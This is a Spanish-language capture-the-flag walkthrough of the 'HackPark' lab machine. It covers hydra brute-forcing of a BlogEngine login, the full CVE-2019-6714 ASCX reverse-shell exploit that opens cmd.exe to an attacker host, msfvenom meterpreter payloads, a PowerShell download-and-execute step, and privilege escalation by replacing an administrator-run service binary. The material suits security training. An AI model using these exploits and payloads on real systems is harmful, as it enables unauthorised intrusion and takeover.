# HackPark

Nos encontramos con una máquina que en su descripción pone:

Fuerza bruta de logins en web con hydra, identificar y usar exploit publicos para escalar privilegios en una máquina Windows!

# Introducción

Ejecuta la máquina y accede al servidor web.

![image](https://github.com/user-attachments/assets/7146f828-eb02-4854-8ed6-4da39522496f)

En la web nos encontramos con una imagen de un payaso, en la cuál la podemos descargar o hacer una "reverse search" (yo he utilizado esta página https://tineye.com)

Respuesta: Pennywise

## Hydra

Ahora necesitaremos encontrar la pagina de logeo y identificar la consulta que hacemos al servidor web. Normalmente las consultas tienen don tipos, GET Y POST.

Podemos ver las consultar haciendo click por ejemplo en el formulario, inspeccionando el eleento y leer los valores. Pudiendo identificar con BurpSuite si se puede llegar a interceptar tráfico.

¿Que tipo de consulta utiliza windows para enviar la consulta? POST

/Account/login.aspx?ReturnURL=/admin

Ahora que sabemos el tipo de consulta y la URL, podemos primero hacer la dicha consulta y posteriormente recogerla y hacer la fuerza bruta con hydra.

![image](https://github.com/user-attachments/assets/f4479457-44b4-4a44-89e6-8064814b3663)

Nos falta el usuario, cosa que es facilita de sacar "blogengine default credentials" : Admin

```
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.202.44 http-post-form "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=Bjdg0T4vJInmW5tUM8x5txmfsq8hz6JGO83P0kbnaJq966zSeFeDAxLS%2BXyw4U4S%2FgpkPbUDHuPw14Mx2Q2QJRFxJ7kenDSk54xKXAp9wDV4gVOW3yEZCH93n0756GyaZ8EyMi58wMwEivOw0zpcHO8xp8e%2Bj32e7h3iv5zKqryGFUPE&__EVENTVALIDATION=31Qm85XIxQI11Fi3HPbRUY6kn21c%2F0zPSqk2UvIRBUu1Tt4QS4oLN1VfqrwJsGOUA5SWiSRdcq5xSwvpOpMlWpc%2FfuQa%2BRGsBlT0juZD%2BREOwscUWk%2BwRvwxsVfiEUUV6Hu35MTQshjrc21mdMKy7m8SMyNHNImtbJDftdJDzqYsNqF7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

- Donde indicamos el usuario, lo más importante es el "http-post-form" seleccionamos la IP y lo que nos ha proporcionado BurpSuite por ultimo cambiamos las variables username y password

![image](https://github.com/user-attachments/assets/50220741-f712-422d-b931-927db3eecfae)

Tenemos la pass vamos a probar a entrar.

![image](https://github.com/user-attachments/assets/b65e6030-3779-4784-8b79-5f98e694c7d6)

Ya dentro del admin vemos la versión de blogEngine que es la 3.3.6 sabiendo esto, vamos a buscar si hay alguna vulnerabilidad publica

VUala https://www.exploit-db.com/exploits/46353

Como podemos ver: 

Primero deberemos abrir un tcpClient "nc -lvnp puerto" porsteriormente subir el archivo (exploit) al "file manager" nos dice que esto se encuentra editando un post y clickando, deberemo subir el archivo con el nombre exacto "PostView.ascx" una vez subido nos iremos a la direccion /App_Data/files 

## BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution

```
# Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
# Date: 02-11-2019
# Exploit Author: Dustin Cobb
# Vendor Homepage: https://github.com/rxtur/BlogEngine.NET/
# Software Link: https://github.com/rxtur/BlogEngine.NET/releases/download/v3.3.6.0/3360.zip
# Version: <= 3.3.6
# Tested on: Windows 2016 Standard / IIS 10.0
# CVE : CVE-2019-6714

/*
 * CVE-2019-6714
 *
 * Path traversal vulnerability leading to remote code execution.  This 
 * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This 
 * is caused by an unchecked "theme" parameter that is used to override
 * the default theme for rendering blog pages.  The vulnerable code can 
 * be seen in this file:
 * 
 * /Custom/Controls/PostList.ascx.cs
 *
 * Attack:
 *
 * First, we set the TcpClient address and port within the method below to 
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the 
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the 
 * blog with a theme override specified like so:
 *
 * http://10.10.10.10/?theme=../../App_Data/files
 *
 */

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.10.10.20", 4445)) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
						
				StringBuilder strInput = new StringBuilder();

				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
    	}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
   	StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    	streamWriter.WriteLine(strOutput);
                    	streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
```

Como podemos ver tenemos unas variables que cambiar : using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.10.10.20", 4445)) {
		using(System.IO.Stream stream = client.GetStream()) {

En mi caso mi ip y puerto

```
rlwrap nc -lvnp 4445
```

Nos dirigimos como hemos dicho anteriormente a un post y añadimos en el file manager.

![image](https://github.com/user-attachments/assets/0ee6f607-0e40-4218-9a05-fdf886164da7)

Una vez añadido ya podemos irnos a la ruta anteriormente especificada "http://10.10.10.10/?theme=../../App_Data/files"

![image](https://github.com/user-attachments/assets/f61a834e-ceb2-4cd1-b5ab-330a16acf226)

Estamos dentro

## Upgradear Shell

Ahora nos toca generar una rev shell con metasploit.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```
Por otro lado deberemos estar en escucha con metasploit

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-thm-ip 
set LPORT listening-port run
```

Ya tenemos todo para poder descargar y ejecutar dicho payload, primero de todo yo recomendaria ir a la carpeta C:\Windows\Temp para asegurarnos de ningun problema con permisos.

```
powershell -c "Invoke-WebRequest -Uri URL -OutFile FILENAME"
```

![image](https://github.com/user-attachments/assets/d059262b-831b-4b7d-a650-fdfed21955d0)

Una vez lo tenemos dentro lo ejecutamos

```
.\shell.exe
```

![image](https://github.com/user-attachments/assets/49a76423-f32f-4c8c-99c3-90a4ecab844e)

Seguimos con las answers:

```
sysinfo
```

¿Cuál es el sistema operativo? Windows 2012 R2 (6.3 Build 9600)

Nos dicen que utilizemos el "indows-exploit-suggester" para identificar vulnerabilidades, vamos a elllo.

Yo en mi caso prefieor utilizar winpeas

https://github.com/peass-ng/PEASS-ng/releases/tag/20231203-9cdcb38f

![image](https://github.com/user-attachments/assets/488bf515-7c11-4a06-a8b3-abe1924aed2f)

Una vez subido a la máquina victima simplemente lo ejecutamos

```
shell
.\winPEASx64.exe
```

![image](https://github.com/user-attachments/assets/84ae2c54-1580-400b-8600-102629dea816)

Aquí vemos un poco de lo que veremos, red, indica privilegios especiales para malas configuraciones, verde protecciones 

Por ahora sacamos cositas como credenciales de administrador

![image](https://github.com/user-attachments/assets/59d47305-82a6-4dd5-b887-3fed64a86793)

![image](https://github.com/user-attachments/assets/7fe8b07b-a882-4d0a-94f8-17e456477a24)

Encontramos un servicio un poco extraño vamos a redirigirnos a el

Parece ser que hay un binario que esta siendo ejecutado por el administrador todo el rato

![image](https://github.com/user-attachments/assets/33e6b1f7-7c67-43ec-a1d5-5747905bb999)

Simplemente lo que haría es crear un payload o una shell con ese nombre y subirlo

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o message.exe
```

En este momento deberemos encontrar el "Message.exe" pista esta en donde los servicios, una vez lo tengamos le cambiaremos el nombre y subiremos nuestro payload igual que las anteriores veces

![image](https://github.com/user-attachments/assets/840170f5-055f-4fdd-883d-ba809b7b16a1)

GG SOMOS ROOT ahora sacaremos las flags de usuario y root







